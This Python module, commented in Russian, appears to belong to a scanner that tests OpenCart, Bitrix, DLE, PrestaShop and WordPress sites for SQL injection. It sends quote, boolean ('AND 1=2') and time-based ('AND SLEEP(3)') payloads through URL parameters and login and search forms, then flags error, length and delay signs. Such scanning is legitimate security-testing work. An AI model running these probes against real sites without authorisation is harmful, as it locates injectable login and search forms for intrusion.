# -*- coding: utf-8 -*-
"""Проверка параметров на SQLi. Числовые — без кавычки, POST — телом формы."""
import statistics
import time
import urllib.parse

from core import findings, http, ui
from modules import mods, profiles

ERR = ("sql syntax", "you have an error in your sql", "warning: mysqli",
       "mysql_fetch", "check the manual that corresponds",
       "unclosed quotation", "quoted string not properly terminated",
       "pg_query", "sqlite3.OperationalError")
SLEEP = 3
ROUNDS = 3

POSTS = {
    "dle": [("/index.php?do=search", "story", "do=search&subaction=search&story={{p}}")],
    "bitrix": [("/?login=yes", "USER_PASSWORD",
                "USER_LOGIN=admin&USER_PASSWORD={{p}}&TYPE=AUTH&backurl=%2F")],
    "prestashop": [("/index.php?controller=authentication", "email",
                    "email={{p}}&passwd=x&submitLogin=1")],
    "wordpress": [("/", "s", "s={{p}}")],
}


def _url(route, param, value):
    base, _, qs = route.partition("?")
    parts = []
    for pair in qs.split("&"):
        if not pair:
            continue
        k, _, v = pair.partition("=")
        parts.append("%s=%s" % (k, urllib.parse.quote(value) if k == param else v))
    return base + "?" + "&".join(parts)


def _p(base, suffix):
    """Числовое значение — без кавычки, иначе с кавычкой."""
    return base + suffix if base.strip().isdigit() else base + "'" + suffix


def _get(host, url):
    t0 = time.time()
    r = http.get(host, url, referer="https://" + host + "/")
    return r, time.time() - t0


def _safe(host, url):
    try:
        return _get(host, url)
    except Exception:
        return None, 0.0


def _post(host, path, param, tpl, value):
    body = tpl.replace("{{p}}", urllib.parse.quote(value))
    t0 = time.time()
    r = http.post(host, path, body, referer="https://" + host + path)
    return r, time.time() - t0


def _safe_post(host, path, param, tpl, value):
    try:
        return _post(host, path, param, tpl, value)
    except Exception:
        return None, 0.0


def _err(r):
    low = r.text.lower()
    for m in ERR:
        if m in low:
            return m
    return ""


def _timed(host, url, rounds=ROUNDS):
    ds = []
    for _ in range(rounds):
        r, dt = _safe(host, url)
        if r is None:
            return 0.0
        ds.append(dt)
        time.sleep(0.2)
    return statistics.median(ds)


def _check(host, label, ref, sender, url_of, tag_path):
    """Общая логика: ошибка, булева пара, время."""
    ref_len = len(ref.content)
    out = []

    q, _ = sender("'")
    if q is None:
        ui.say("%-28s сбой" % label)
        return out
    if q.status_code == 403 and ref.status_code == 200:
        ui.say("%-28s кавычка закрыта (403)" % label)
        return out
    e = _err(q)
    if e:
        ui.ok("%-28s ОШИБКА SQL" % label)
        out.append(findings.make(host, url_of("'"), "sqli-error", q.status_code,
                                 len(q.content), ref_len, q.text, "'", e))
        return out

    a, _ = sender(" AND 1=1-- -")
    b, _ = sender(" AND 1=2-- -")
    if a is not None and b is not None:
        la, lb = len(a.content), len(b.content)
        if abs(la - lb) > max(300, la // 20):
            ui.ok("%-28s БУЛЕВА: %d против %d" % (label, la, lb))
            out.append(findings.make(host, url_of(" AND 1=2-- -"), "sqli-bool",
                                     b.status_code, lb, la, b.text, " AND 1=2-- -"))
            return out

    dt = _timed(host, url_of(" AND SLEEP(%d)-- -" % SLEEP))
    if dt >= SLEEP * 0.7:
        ui.ok("%-28s ВРЕМЕННАЯ: медиана %.1f c" % (label, dt))
        out.append(findings.make(host, url_of(" AND SLEEP(%d)-- -" % SLEEP), "sqli-time",
                                 0, 0, ref_len, "", " AND SLEEP(%d)-- -" % SLEEP,
                                 "%.1f c" % dt))
    else:
        ui.say("%-28s чисто (медиана %.1f c)" % (label, dt))
    return out


def run(host, kind="opencart"):
    out = []
    routes = list((profiles.get(kind) or {}).get("params") or [])
    if kind == "opencart":
        try:
            routes += mods.routes(mods.list_mods(host))
        except Exception:
            pass

    for route, param, base in routes:
        if not base:
            continue
        ref, _ = _safe(host, _url(route, param, base))
        if ref is None:
            ui.say("%-28s нет ответа" % param)
            continue

        def sender(sfx, route=route, param=param, base=base):
            return _safe(host, _url(route, param, _p(base, sfx)))

        def url_of(sfx, route=route, param=param, base=base):
            return _url(route, param, _p(base, sfx))

        out += _check(host, param, ref, sender, url_of, route)
        time.sleep(0.3)

    for path, param, tpl in POSTS.get(kind or "", []) or []:
        ref, _ = _safe_post(host, path, param, tpl, "test")
        if ref is None:
            continue

        def sender(sfx, path=path, param=param, tpl=tpl):
            return _safe_post(host, path, param, tpl, "test" + sfx)

        def url_of(sfx, path=path):
            return path

        out += _check(host, param + " (POST)", ref, sender, url_of, path)
        time.sleep(0.3)

    print()
    if out:
        ui.ok("подозрительные параметры: %d" % len(out))
        for f in out:
            ui.say("  %s %s" % (f["tag"], f["url"]))
    else:
        ui.say("чисто")
    return out
